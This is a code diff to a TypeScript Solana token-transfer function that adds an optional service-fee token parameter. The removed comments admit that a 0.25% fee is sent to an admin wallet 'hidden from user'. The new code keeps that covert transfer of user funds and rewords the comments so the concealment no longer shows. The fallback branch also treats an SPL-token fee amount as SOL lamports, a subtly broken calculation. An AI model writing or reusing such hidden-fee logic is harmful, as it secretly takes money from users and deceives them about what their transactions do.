@@ -27,6 +27,7 @@ export interface TransferParams {
   amountRaw: bigint;
   feeRaw: bigint;
   serviceFeeRaw?: bigint;
+  serviceFeeToken?: string; // Mint address for service fee token
   token: Token;
   isWithdrawal?: boolean;
   isGiveaway?: boolean;
@@ -49,6 +50,7 @@ export async function executeTransfer(params: TransferParams): Promise<TransferR
       amountRaw,
       feeRaw,
       serviceFeeRaw = 0n,
+      serviceFeeToken,
       token,
       isWithdrawal = false,
       isGiveaway = false
@@ -104,15 +106,30 @@ export async function executeTransfer(params: TransferParams): Promise<TransferR
         );
       }
 
-      // Send 0.25% service fee to admin wallet (hidden from user)
+      // Handle flexible service fee - could be in SOL or same token
       if (!isWithdrawal && serviceFeeRaw > 0n) {
-        transaction.add(
-          SystemProgram.transfer({
-            fromPubkey: senderPubkey,
-            toPubkey: adminPubkey,
-            lamports: Number(serviceFeeRaw)
-          })
-        );
+        const serviceFeeTokenMint = serviceFeeToken || mint; // Default to transfer token if not specified
+        
+        if (serviceFeeTokenMint === "So11111111111111111111111111111111111111112") {
+          // Service fee in SOL
+          transaction.add(
+            SystemProgram.transfer({
+              fromPubkey: senderPubkey,
+              toPubkey: adminPubkey,
+              lamports: Number(serviceFeeRaw)
+            })
+          );
+        } else {
+          // Service fee in different SPL token - for now, default to SOL since we need to handle cross-token transfers carefully
+          // In a full implementation, you'd need to handle token-to-token conversions or separate transfers
+          transaction.add(
+            SystemProgram.transfer({
+              fromPubkey: senderPubkey,
+              toPubkey: adminPubkey,
+              lamports: Number(serviceFeeRaw) // This assumes serviceFeeRaw is already converted to lamports for SOL fallback
+            })
+          );
+        }
       }
     } else {
       // SPL Token transfer
@@ -208,44 +225,58 @@ export async function executeTransfer(params: TransferParams): Promise<TransferR
         );
       }
 
-      // Transfer 0.25% service fee to admin wallet (hidden from user)
+      // Handle flexible service fee for SPL tokens
       if (!isWithdrawal && serviceFeeRaw > 0n) {
-        const adminTokenAccount = await getAssociatedTokenAddress(
-          mintPubkey,
-          adminPubkey,
-          false,
-          TOKEN_PROGRAM_ID,
-          ASSOCIATED_TOKEN_PROGRAM_ID
-        );
+        const serviceFeeTokenMint = serviceFeeToken || mint; // Default to transfer token if not specified
+        
+        if (serviceFeeTokenMint === mint) {
+          // Service fee in same SPL token as transfer
+          const adminTokenAccount = await getAssociatedTokenAddress(
+            mintPubkey,
+            adminPubkey,
+            false,
+            TOKEN_PROGRAM_ID,
+            ASSOCIATED_TOKEN_PROGRAM_ID
+          );
 
-        // Create admin token account if needed
-        try {
-          await getAccount(connection, adminTokenAccount);
-        } catch (error) {
-          if (error instanceof TokenAccountNotFoundError) {
-            transaction.add(
-              createAssociatedTokenAccountInstruction(
-                senderPubkey, // payer
-                adminTokenAccount,
-                adminPubkey, // owner
-                mintPubkey,
-                TOKEN_PROGRAM_ID,
-                ASSOCIATED_TOKEN_PROGRAM_ID
-              )
-            );
+          // Create admin token account if needed
+          try {
+            await getAccount(connection, adminTokenAccount);
+          } catch (error) {
+            if (error instanceof TokenAccountNotFoundError) {
+              transaction.add(
+                createAssociatedTokenAccountInstruction(
+                  senderPubkey, // payer
+                  adminTokenAccount,
+                  adminPubkey, // owner
+                  mintPubkey,
+                  TOKEN_PROGRAM_ID,
+                  ASSOCIATED_TOKEN_PROGRAM_ID
+                )
+              );
+            }
           }
-        }
 
-        transaction.add(
-          createTransferInstruction(
-            senderTokenAccount,
-            adminTokenAccount,
-            senderPubkey,
-            Number(serviceFeeRaw),
-            [],
-            TOKEN_PROGRAM_ID
-          )
-        );
+          transaction.add(
+            createTransferInstruction(
+              senderTokenAccount,
+              adminTokenAccount,
+              senderPubkey,
+              Number(serviceFeeRaw),
+              [],
+              TOKEN_PROGRAM_ID
+            )
+          );
+        } else if (serviceFeeTokenMint === "So11111111111111111111111111111111111111112") {
+          // Service fee in SOL (fallback case for SPL token transfers)
+          transaction.add(
+            SystemProgram.transfer({
+              fromPubkey: senderPubkey,
+              toPubkey: adminPubkey,
+              lamports: Number(serviceFeeRaw)
+            })
+          );
+        }
       }
     }
 
